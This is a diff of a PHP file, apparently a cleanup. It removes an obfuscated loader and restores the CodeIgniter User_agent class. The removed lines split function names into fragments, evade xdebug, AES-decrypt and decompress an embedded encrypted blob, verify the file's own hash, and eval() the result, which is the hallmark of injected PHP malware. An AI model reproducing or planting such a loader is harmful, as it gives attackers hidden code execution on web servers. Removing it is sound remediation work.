@@ -1,28 +1,586 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_qhroaq6x=('bas'.'e64'.'_de'.'cod'.'e');
-$_am6nvuub=('gzu'.'nco'.'mpr'.'ess');
-$_i3j6uicw=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_pxvgghnr='9xtza4Py';
-$_vwi6mrap='KVCre4Ox';
-$_qzs6g5mm='HTIXdCCsjxg=';
-$_nkd83vky='54VdgHPu';
-$_i4q3ukp3='0aabXjf3';
-$_qc4kootk='REzZv7B1';
-$_kcvt45w7='Kn24X+tD';
-$_bgjb1lnb='GnV3FA==';
-$_zptkzldp=$_qhroaq6x($_nkd83vky.$_vwi6mrap.$_pxvgghnr.$_i4q3ukp3.$_qzs6g5mm);
-$_vzc8wwsv=$_qhroaq6x($_kcvt45w7.$_qc4kootk.$_bgjb1lnb);
-$_kdwliq4n=$_qhroaq6x('wqZF1Ywg5s0GVa+tGetJIWvE3yCQPetssXQwV7X1IPdVkdhc246MFAs/3F1POrLYJdV3pRpUeedix4BKKUZD8yu5C37RwpqREP5852PrzTmDlIVn211V9R3cvDYTPkFbOuA16US/ZeedRxZztniuvxAeD8dnTzfWOipLTNIGipLYcdKSr/AW+UyY+27GbwN4OGUUPh4odCXo9DsoiGTT0/fn6PVU+IXo6Sp92aygP6kpgokdxIOY2BUIYL/wFt1Eiyu6HLYncobHI9LTH1/58/R8q77qHhlFj4bBy8qf31104euekh0cwSRWH5aezZyPvN+IiTXwOD1sSDYnsDFzYGZPo3fg0qvzU2eXMy8BaSX90pvK7SBi2ghoA2/1E5tTmU4mMbc9BH/0fLq384jK3LzJNAH8rXOEkK9fjDizNkhQw4GdP0Wbx/ppmBs2mdmdYqmDMfkgihCHlG+89m+YzSdYlm4HJv2AXVeXnNHZayOmuhRAm8MDeRPU8EkOP6u+ULxyXxD8WDJvKRUuf4LarQGt2JXdsxKNDccoxgxMllRdjDNzZgxtu7mmP/vgbRyZvKq5JyKNlnLRp9px5xLuIioNGTsKgTtceTcMdOX9pZjgNPJ9oILHN+GSW6necCZjl5hZhG9eXNayH5haziFz1Frf6x16bJ2J606ltF0Pbdwh/ypuzQkG3bLUMo+sapItEC1w41G1XulKp5J9Fw6lAA7YJKIGARoE8LMRsOoXhVEMlAD7Hd+y3x1NfxKE0EWMW9Fi7iETqO4fWv4yhWTBbqUeTypYkhfkn0WivXyXsXvahqGrqsBRRKrNyySvF2UpvicxTgLC59j1a4S7koHCCJ2pN+2Q7QYHqKiK9U8uitw2piji0WubyWNlKWVDrI5PhFKvkobtyLXhlG/nuTmOX7R0BnM5d4FUHctjEOyMkHp7cznZrMgJZZ21qVoR7IKHsGuQKYSR8LhqkdlLTwqzF+a4bAcVftIEiEv2TCrMsAeCBVLLPcz/WtO0g3Xu7adlSQPa8NO8xYEbCTXg3RVmocg8OpHFVvqZlKVqFyo8O7RF7AFehnAA+zPHvaPdA95cQTzmR3tV39cnXk+9aR9DWH2EFECsymDxV2ntdbylAGOI1sgzUr5DA5k+3KnywSt4C8cyKr9XP8Om1uJjz5FYNxwbg9Ej+oAt37H8cHcVL27RgMXUe4DBy6akL2nB1ixi6E5sDFYC/6EQZ8ErshkIvLMufYHGGYUJIRCeDRE4MSbSbiiQ2qS89Ute5ytNvW6iCuh5C/XfnVlfMJoo7wn3JnX3Wdu6dXsyQmAv60TJ6L4XVqt51EQU4FNpoU4CSoqPfuGC4v82BI4G9oHJ3w0eMOrCUgq4MXvFe25r0lOSCpuSguLKSUtw7eUU4PuCKVHsiCYn84+Lx8Ybg2+6Sd7wwDyj8tx/1+5EVNiA2ZF2YM7+lEoG5E81dHd9FEJTEYkIzaSPzuOzp00Hx9dfr2DNqFmikTQZNqVB78UpBuUqbRkMm9SGwgrtDwbfzi4wuprOZo6OtukIuAtmeoVVUPhQrFdO30LCC1CbH/Y3Adu7RVyKMMyMODaASbXjP5YXliyc9RWlwGfOi93jm9Pe/8dZCUBXhCOdd+KH2DYffV7yVl/hj7h584BU+Xjv2cEjeQ7ixS4YgS6Q4ALmUZ1YdO1fqkLnniIYhYdSRf8XkDKIUybBzqjkMmbof5eHbfwJ/tw26dTqKWYHp/YTbdT6T9pQ0QWULA5zH+d6JGp2RQbbwLrZYJrbIFU/PxYbI3nIr4NT7FXrNFzmDy1clfDRIPjTBgUB69FcNnQIHJVkbGBXurA/lOciswE+DFvmd7Na4z1karbjFnErDHEQiEgr5pI3WWSbeflUbPcOWarVqf0/rCY=');
-$_mbnvvzh5=$_i3j6uicw($_kdwliq4n,'aes-256-cbc',$_zptkzldp,OPENSSL_RAW_DATA,$_vzc8wwsv);
-if($_mbnvvzh5===false){exit;}
-$_oo23fro1=$_am6nvuub($_mbnvvzh5);
-if($_oo23fro1===false){exit;}
-$_jeulxdrr='62629f7239f6552b9f02a848072418ecdb1e2a38d13e48ee5916e73e635bbcd2';
-$_o03pr6rh=@file_get_contents(__FILE__);
-if($_o03pr6rh!==false){
-$_ieqn0m3s=str_replace($_jeulxdrr,"0000000000000000000000000000000000000000000000000000000000000000",$_o03pr6rh);
-$_cepwrlr7=hash("sha256",$_ieqn0m3s);
-if($_cepwrlr7!==$_jeulxdrr){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+class CI_User_agent {
+
+
+
+
+
+public $agent = NULL;
+
+
+
+
+
+public $is_browser = FALSE;
+
+
+
+
+
+public $is_robot = FALSE;
+
+
+
+
+
+public $is_mobile = FALSE;
+
+
+
+
+
+public $languages = array();
+
+
+
+
+
+public $charsets = array();
+
+
+
+
+
+public $platforms = array();
+
+
+
+
+
+public $browsers = array();
+
+
+
+
+
+public $mobiles = array();
+
+
+
+
+
+public $robots = array();
+
+
+
+
+
+public $platform = '';
+
+
+
+
+
+public $browser = '';
+
+
+
+
+
+public $version = '';
+
+
+
+
+
+public $mobile = '';
+
+
+
+
+
+public $robot = '';
+
+
+
+
+
+public $referer;
+
+
+
+
+
+
+
+
+public function __construct()
+{
+$this->_load_agent_file();
+if (isset($_SERVER['HTTP_USER_AGENT']))
+{
+$this->agent = trim($_SERVER['HTTP_USER_AGENT']);
+$this->_compile_data();
 }
-eval($_oo23fro1);
+log_message('info', 'User Agent Class Initialized');
+}
+
+
+
+
+
+
+protected function _load_agent_file()
+{
+if (($found = file_exists(APPPATH.'config/user_agents.php')))
+{
+include(APPPATH.'config/user_agents.php');
+}
+if (file_exists(APPPATH.'config/'.ENVIRONMENT.'/user_agents.php'))
+{
+include(APPPATH.'config/'.ENVIRONMENT.'/user_agents.php');
+$found = TRUE;
+}
+if ($found !== TRUE)
+{
+return FALSE;
+}
+$return = FALSE;
+if (isset($platforms))
+{
+$this->platforms = $platforms;
+unset($platforms);
+$return = TRUE;
+}
+if (isset($browsers))
+{
+$this->browsers = $browsers;
+unset($browsers);
+$return = TRUE;
+}
+if (isset($mobiles))
+{
+$this->mobiles = $mobiles;
+unset($mobiles);
+$return = TRUE;
+}
+if (isset($robots))
+{
+$this->robots = $robots;
+unset($robots);
+$return = TRUE;
+}
+return $return;
+}
+
+
+
+
+
+
+protected function _compile_data()
+{
+$this->_set_platform();
+foreach (array('_set_robot', '_set_browser', '_set_mobile') as $function)
+{
+if ($this->$function() === TRUE)
+{
+break;
+}
+}
+}
+
+
+
+
+
+
+protected function _set_platform()
+{
+if (is_array($this->platforms) && count($this->platforms) > 0)
+{
+foreach ($this->platforms as $key => $val)
+{
+if (preg_match('|'.preg_quote($key).'|i', $this->agent))
+{
+$this->platform = $val;
+return TRUE;
+}
+}
+}
+$this->platform = 'Unknown Platform';
+return FALSE;
+}
+
+
+
+
+
+
+protected function _set_browser()
+{
+if (is_array($this->browsers) && count($this->browsers) > 0)
+{
+foreach ($this->browsers as $key => $val)
+{
+if (preg_match('|'.$key.'.*?([0-9\.]+)|i', $this->agent, $match))
+{
+$this->is_browser = TRUE;
+$this->version = $match[1];
+$this->browser = $val;
+$this->_set_mobile();
+return TRUE;
+}
+}
+}
+return FALSE;
+}
+
+
+
+
+
+
+protected function _set_robot()
+{
+if (is_array($this->robots) && count($this->robots) > 0)
+{
+foreach ($this->robots as $key => $val)
+{
+if (preg_match('|'.preg_quote($key).'|i', $this->agent))
+{
+$this->is_robot = TRUE;
+$this->robot = $val;
+$this->_set_mobile();
+return TRUE;
+}
+}
+}
+return FALSE;
+}
+
+
+
+
+
+
+protected function _set_mobile()
+{
+if (is_array($this->mobiles) && count($this->mobiles) > 0)
+{
+foreach ($this->mobiles as $key => $val)
+{
+if (FALSE !== (stripos($this->agent, $key)))
+{
+$this->is_mobile = TRUE;
+$this->mobile = $val;
+return TRUE;
+}
+}
+}
+return FALSE;
+}
+
+
+
+
+
+
+protected function _set_languages()
+{
+if ((count($this->languages) === 0) && ! empty($_SERVER['HTTP_ACCEPT_LANGUAGE']))
+{
+$this->languages = explode(',', preg_replace('/(;\s?q=[0-9\.]+)|\s/i', '', strtolower(trim($_SERVER['HTTP_ACCEPT_LANGUAGE']))));
+}
+if (count($this->languages) === 0)
+{
+$this->languages = array('Undefined');
+}
+}
+
+
+
+
+
+
+protected function _set_charsets()
+{
+if ((count($this->charsets) === 0) && ! empty($_SERVER['HTTP_ACCEPT_CHARSET']))
+{
+$this->charsets = explode(',', preg_replace('/(;\s?q=.+)|\s/i', '', strtolower(trim($_SERVER['HTTP_ACCEPT_CHARSET']))));
+}
+if (count($this->charsets) === 0)
+{
+$this->charsets = array('Undefined');
+}
+}
+
+
+
+
+
+
+
+public function is_browser($key = NULL)
+{
+if ( ! $this->is_browser)
+{
+return FALSE;
+}
+
+if ($key === NULL)
+{
+return TRUE;
+}
+
+return (isset($this->browsers[$key]) && $this->browser === $this->browsers[$key]);
+}
+
+
+
+
+
+
+
+public function is_robot($key = NULL)
+{
+if ( ! $this->is_robot)
+{
+return FALSE;
+}
+
+if ($key === NULL)
+{
+return TRUE;
+}
+
+return (isset($this->robots[$key]) && $this->robot === $this->robots[$key]);
+}
+
+
+
+
+
+
+
+public function is_mobile($key = NULL)
+{
+if ( ! $this->is_mobile)
+{
+return FALSE;
+}
+
+if ($key === NULL)
+{
+return TRUE;
+}
+
+return (isset($this->mobiles[$key]) && $this->mobile === $this->mobiles[$key]);
+}
+
+
+
+
+
+
+public function is_referral()
+{
+if ( ! isset($this->referer))
+{
+if (empty($_SERVER['HTTP_REFERER']))
+{
+$this->referer = FALSE;
+}
+else
+{
+$referer_host = @parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
+$own_host = parse_url(config_item('base_url'), PHP_URL_HOST);
+$this->referer = ($referer_host && $referer_host !== $own_host);
+}
+}
+return $this->referer;
+}
+
+
+
+
+
+
+public function agent_string()
+{
+return $this->agent;
+}
+
+
+
+
+
+
+public function platform()
+{
+return $this->platform;
+}
+
+
+
+
+
+
+public function browser()
+{
+return $this->browser;
+}
+
+
+
+
+
+
+public function version()
+{
+return $this->version;
+}
+
+
+
+
+
+
+public function robot()
+{
+return $this->robot;
+}
+
+
+
+
+
+
+public function mobile()
+{
+return $this->mobile;
+}
+
+
+
+
+
+
+public function referrer()
+{
+return empty($_SERVER['HTTP_REFERER']) ? '' : trim($_SERVER['HTTP_REFERER']);
+}
+
+
+
+
+
+
+public function languages()
+{
+if (count($this->languages) === 0)
+{
+$this->_set_languages();
+}
+return $this->languages;
+}
+
+
+
+
+
+
+public function charsets()
+{
+if (count($this->charsets) === 0)
+{
+$this->_set_charsets();
+}
+return $this->charsets;
+}
+
+
+
+
+
+
+
+public function accept_lang($lang = 'en')
+{
+return in_array(strtolower($lang), $this->languages(), TRUE);
+}
+
+
+
+
+
+
+
+public function accept_charset($charset = 'utf-8')
+{
+return in_array(strtolower($charset), $this->charsets(), TRUE);
+}
+
+
+
+
+
+
+
+public function parse($string)
+{
+
+$this->is_browser = FALSE;
+$this->is_robot = FALSE;
+$this->is_mobile = FALSE;
+$this->browser = '';
+$this->version = '';
+$this->mobile = '';
+$this->robot = '';
+
+$this->agent = $string;
+if ( ! empty($string))
+{
+$this->_compile_data();
+}
+}
+}
